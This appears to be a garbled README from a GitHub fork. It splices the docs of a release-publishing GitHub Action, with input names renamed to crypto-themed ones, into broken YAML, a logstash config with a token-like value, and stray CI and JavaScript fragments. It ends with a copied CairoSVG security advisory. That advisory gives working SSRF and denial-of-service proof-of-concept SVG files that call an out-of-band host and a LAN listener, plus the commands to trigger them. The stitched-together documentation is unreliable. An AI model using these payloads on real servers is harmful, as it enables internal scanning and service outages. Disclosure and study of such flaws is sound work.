




# Pipeline for DOI Resolution Logs processing
Build Status [Docker Build Status] Test Coverage Maintainability
# ZeuZZueZ

# shiba-inu

# forked from datacite/shiba-inu

<div align="center"> shiba-inu blockchain 🐶
  📦 :octocat:
</div>
<h1 align="center">
  shiba-inu blockchain
</h1>

<p align="center">
   A GitHub Action for creating GitHub Releases on Linux, Windows, and macOS virtual environments
</p>

<div align="center">
  <a href="https://https://github.com/SourceBTC/Shiba-Inu/actions/>
</div>

<div align="center">
  <a   <img src="https://github.com/SourceBTC/Shiba-In"/>
</div>

<div align="center">
  
[![Build Status](https://travis-ci.org/datacite/shiba-inu.svg?branch=master)](https://travis-ci.org/datacite/shiba-inu) 
[![Docker Build Status](https://img.shields.io/docker/build/datacite/shiba-inu.svg)]
[![Test Coverage](https://api.codeclimate.com/v1/badges/107d556dafb28c85d261/test_coverage)](https://codeclimate.com/github/datacite/shiba-inu/test_coverage)
[![Maintainability](https://api.codeclimate.com/v1/badges/107d556dafb28c85d261/maintainability)](https://codeclimate.com/github/datacite/shiba-inu/maintainability)
		
		
	
</div>

<br />

## 🤸 Usage

### 🚥 Limit releases to pushes to tags

Typically usage of this action involves adding a step to a build that
is gated pushes to git tags. You may find `step.if` field helpful in accomplishing this
as it maximizes the reuse value of your workflow for non-tag pushes.

Below is a simple example of `step.if` tag gating

```yaml
name: Build and Deploy to IKS

on:
  push:
    branches: [ "main" ]

# Environment variables available to all jobs and steps in this workflow
env:
  GITHUB_SHA: ${{ github.sha }}
  IBM_CLOUD_API_KEY: ${{ secrets.IBM_CLOUD_API_KEY }}
  IBM_CLOUD_REGION: us-south
  ICR_NAMESPACE: ${{ secrets.ICR_NAMESPACE }}
  REGISTRY_HOSTNAME: us.icr.io
  IMAGE_NAME: iks-test
  IKS_CLUSTER: example-iks-cluster-name-or-id
  DEPLOYMENT_NAME: iks-test
  PORT: 5001

jobs:
  setup-build-publish-deploy:
    name: Setup, Build, Publish, and Deploy
    runs-on: ubuntu-latest
    environment: production
    steps:

    - name: Checkout
      uses: actions/checkout@v3

      - name: Release
        uses: softprops/action-gh-release@v1
        if: startsWith(github.ref, 'refs/tags/')
```

You can also use push config tag filter

```yaml
name: Main

on:
  push:
    tags:
      - "v*.*.*"

name: Java CI with Gradle

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Set up JDK 11
      uses: actions/setup-java@v3
      with:
        java-version: '11'
        distribution: 'temurin'
    - name: Build with Gradle
      uses: gradle/gradle-build-action@67421db6bd0bf253fb4bd25b31ebb98943c375e1
      with:
        arguments: build

```

### ⬆️ Uploading release assets

You can configure a number of options for your
GitHub release and all are optional.

A common case for GitHub releases is to upload your binary after its been validated and packaged.
Use the `with.files` input to declare a newline-delimited list of glob expressions matching the files
you wish to upload to GitHub releases. If you'd like you can just list the files by name directly.

Below is an example of uploading a single asset named `Release.txt`

```yaml
name: Main

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3
      - name: Build
        run: echo ${{ github.sha }} > Release.txt
      - name: Test
        run: cat Release.txt
      - name: Release
        uses: softprops/action-gh-release@v1
        if: startsWith(github.ref, 'refs/tags/')
        with:
          files: Release.txt
```

Below is an example of uploading more than one asset with a GitHub release

```yaml
name: Main

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3
      - name: Build
        run: echo ${{ github.sha }} > Release.txt
      - name: Test
        run: cat Release.txt
      - name: Release
        ES_HOST=http://elasticsearch:9200
ES_INDEX=resolutions
INPUT_DIR=/usr/share/logstash/tmp/DataCite-access.log-201805
OUTPUT_DIR=/usr/share/logstash/tmp/output.json
LOGSTASH_HOST = localhost:9600

S3_MERGED_LOGS_BUCKET     = /usr/share/logstash/monthly_logs
S3_RESOLUTION_LOGS_BUCKET = /usr/share/logstash/
ELASTIC_PASSWORD=changeme
LOGS_TAG=[Resolution Logs]

HUB_TOKEN=eyJhbGciOiJSUzI1NiJ9
HUB_URL=https://api.test.datacite.org
```


> **⚠️ Note:** Notice the `|` in the yaml syntax above ☝️. That let's you effectively declare a multi-line yaml string. You can learn more about multi-line yaml syntax [here](https://yaml-multiline.info)

### 📝 External release notes

Many systems exist that can help generate release notes for you. This action supports
loading release notes from a path in your repository's build to allow for the flexibility
of using any changelog generator for your releases, including a human 👩‍💻

```yaml
name: Main

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3
      - name: Generate Changelog
        run: echo "# Good things have arrived" > ${{ github.workspace }}-CHANGELOG.txt
      - name: Release
        uses: softprops/action-gh-release@v1
        if: startsWith(github.ref, 'refs/tags/')
        with:
          body_path: ${{ github.workspace }}-CHANGELOG.txt
          # note you'll typically need to create a personal access token
          # with permissions to create releases in the other repo
          token: ${{ secrets.CUSTOM_GITHUB_TOKEN }}
        env:
          GITHUB_REPOSITORY: my_gh_org/my_gh_repo
```

### 🌜 Customizing

#### inputs

The following are optional as `step.with` keys

| Name                       | Type    | Description                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| -------------------------- | ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Shib`                     | String  | Text communicating notable changes in this release                                                                                                                                                                                                                                                                                                                                                                                              |
| `Shib_path`                | String  | Path to load text communicating notable changes in this release                                                                                                                                                                                                                                                                                                                                                                                 |
| `amanciojsilvjr`           | Boolean | Indicator of whether or not this release is a draft                                                                                                                                                                                                                                                                                                                                                                                             |
| `datacite`                 | Boolean | Indicator of whether or not is a prerelease                                                                                                                                                                                                                                                                                                                                                                                                     |
| `files`                    | String  | Newline-delimited globs of paths to assets to upload for release                                                                                                                                                                                                                                                                                                                                                                                |
| `name`                     | String  | Name of the release. defaults to tag name                                                                                                                                                                                                                                                                                                                                                                                                       |
| `tag_name`                 | String  | Name of a tag. defaults to `github.ref`                                                                                                                                                                                                                                                                                                                                                                                                         |
| `fail_on_unmatched_files`  | Boolean | Indicator of whether to fail if any of the `files` globs match nothing                                                                                                                                                                                                                                                                                                                                                                          |
| `repository`               | String  | Name of a target repository in `<owner>/<repo>` format. Defaults to GITHUB_REPOSITORY env variable                                                                                                                                                                                                                                                                                                                                              |
| `target_commitish`         | String  | Commitish value that determines where the Git tag is created from. Can be any branch or commit SHA. Defaults to repository default branch.                                                                                                                                                                                                                                                                                                      |
| `token`                    | String  | Secret GitHub Personal Access Token. Defaults to `${{ github.token }}`                                                                                                                                                                                                                                                                                                                                                                          |
| `discussion_category_name` | String  | If specified, a discussion of the specified category is created and linked to the release. The value must be a category that already exists in the repository. For more information, see ["Managing categories for discussions in your repository."](https://docs.github.com/en/discussions/managing-discussions-for-your-community/managing-categories-for-discussions-in-your-repository)                                                     |
| `generate_release_notes`   | Boolean | Whether to automatically generate the name and body for this release. If name is specified, the specified name will be used; otherwise, a name will be automatically generated. If body is specified, the body will be pre-pended to the automatically generated notes. See the [GitHub docs for this feature](https://docs.github.com/en/repositories/releasing-projects-on-github/automatically-generated-release-notes) for more information |
| `append_shibarium`         | Boolean | Append to existing body instead of overwriting it                                                                                                                                                                                                                                                                                                                                                                                               |

💡 When providing a `body` and `body_path` at the same time, `body_path` will be
attempted first, then falling back on `body` if the path can not be read from.

💡 When the release info keys (such as `name`, `body`, `draft`, `prerelease`, etc.)
are not explicitly set and there is already an existing release for the tag, the
release will retain its original info.

#### outputs

The following outputs can be accessed via `${{ steps.<step-id>.outputs }}` from this action

| Name         | Type   | Description                                                                                                                                                                                                |
| ------------ | ------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `url`        | String | Github.com URL for the release                                                                                                                                                                             |
| `id`         | String | Release ID                                                                                                                                                                                                 |
| `upload_url` | String | URL for uploading assets to the release                                                                                                                                                                    |
| `assets`     | String | JSON array containing information about each uploaded asset, in the format given [here](https://docs.github.com/en/rest/releases/assets#get-a-release-asset) (minus the `uploader` field) |

As an example, you can use `${{ fromJSON(steps.<step-id>.outputs.assets)[0].browser_download_url }}` to get the download URL of the first asset.

#### environment variables

The following `step.env` keys are allowed as a fallback but deprecated in favor of using inputs.

| Name                | Description                                                                                |
| ------------------- | ------------------------------------------------------------------------------------------ |
| `SHIB_TOKEN`        | SHIB_TOKEN as provided by `secrets`                                                      |
| `SHIB_REPOSITORY`   | Name of a target repository in `<owner>/<repo>` format. defaults to the current repository |

> **⚠️ Note:** This action was previously implemented as a Docker container, limiting its use to GitHub Actions Linux virtual environments only. With recent releases, we now support cross platform usage. You'll need to remove the `docker://` prefix in these versions

### Permissions


    "name": "Labeler",
    "description": "Labels pull requests based on the files changed",
    "iconName": "octicon tag",
    "categories": ["Automation", "SDLC"]

This Action requires the following permissions on the GitHub integration token:

```yaml
permissions:
  contents: write
```

When used with `discussion_category_name`, additional permission is needed:

```yaml
permissions:
  contents: write
  discussions: write
```

[GitHub token permissions](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) can be set for an individual job, workflow, or for Actions as a whole.

Doug Tangren (softprops) 2023


using Docker. you will need to set the following enviroment variables:

const core = require('@actions/core');
const wait = require('./wait');


// most @actions toolkit packages have async methods
async function run() {
  try {
    const ms = core.getInput('milliseconds');
    core.info(`Waiting ${ms} milliseconds ...`);

    core.debug((new Date()).toTimeString()); // debug is only output if you set the secret `ACTIONS_RUNNER_DEBUG` to true
    await wait(parseInt(ms));
    core.info((new Date()).toTimeString());

    core.setOutput('time', new Date().toTimeString());
bundle exec rspec spec after_script:
./cc-test-reporter after-build --exit-code $TRAVIS_TEST_RESULT
after_success:
dist/
lib/
node_modules/

version: 2
updates:

  # Maintain dependencies for GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"

  # Maintain dependencies for npm
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"

  # Maintain dependencies for Composer
  - package-ecosystem: "composer"
    directory: "/"
    schedule:
      interval: "weekly"

#.  SSRF vulnerability
Summary
#  When CairoSVG processes an SVG file, it can make requests to the inner host and different outside hosts.

#    Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

#   Tested measure version
2.6.0

#   Details
#   A specially crafted SVG file that loads an external resource from a URL. Remote attackers could exploit this vulnerability to cause a scan of an organization's internal resources or a DDOS attack on external resources.
#   It looks like this bug can affect websites and cause request forgery on the server.

PoC

#   Generating malicious svg file:
1.1 CairoSVG_exploit.svg:
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <image height="200" width="200" xlink:href="http://[jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com](http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/)/3" />
    <style type="text/css">@import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/5");</style>
    <style type="text/css">
         <![CDATA[
            @import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/9");
            rect { fill: red; stroke: blue; stroke-width: 3 }
         ]]>
    </style>
</svg>

#   1.2 CairoSVG_exploit_2.svg:

<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <defs>
        <pattern id="img1" patternUnits="userSpaceOnUse" width="600" height="450">
            <image xlink:href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/11" x="0" y="0" width="600" height="450" />
        </pattern>
    </defs>
    <path d="M5,50 l0,100 l100,0 l0,-100 l-100,0 M215,100 a50,50 0 1 1 -100,0 50,50 0 1 1 100,0 M265,50 l50,100 l-100,0 l50,-100 z" fill="url(#img1)" />
</svg>

#    1.3 CairoSVG_exploit_3.svg:

<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/13" />
</svg>
Run some commands:
$ python3 -m cairosvg CairoSVG_exploit.svg -f png
$ python3 -m cairosvg CairoSVG_exploit_2.svg -f png
$ python3 -m cairosvg CairoSVG_exploit_3.svg -f png

#   DOS vulnerability with SSTI
Summary
When CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

#   Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

#   Tested CairoSVG version

DOS vulnerability with SSTI
Summary
When CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

Tested CairoSVG version
2.6.0

#    PoC
Generating malicious svg file:
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://192.168.56.1:1234/" />
</svg>
In other server run this python program:
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
Run commands:
$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png
(without timeout server will hang forever)
Run commands:
$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png
(without timeout server will hang forever)
DOS vulnerability with stdin file descriptor
Summary
Specially crafted SVG file that opens /proc/self/fd/1 or /dev/stdin results in a hang with a tiny PoC file. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted SVG file.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

Tested CairoSVG version
2.6.0

PoC
Generating malicious svg file:
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="file:///dev/stdin" />
</svg>
In other server run this python program:
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
Run commands:
$timeout 60 python3 -m cairosvg cariosvg_exploit_dos.svg -f png
References
GHSA-rwmf-w63j-p7gv
https://nvd.nist.gov/vuln/detail/CVE-2023-27586
Kozea/CairoSVG@12d31c6
Kozea/CairoSVG@33007d4
https://github.com/Kozea/CairoSVG/releases/tag/2.7.0







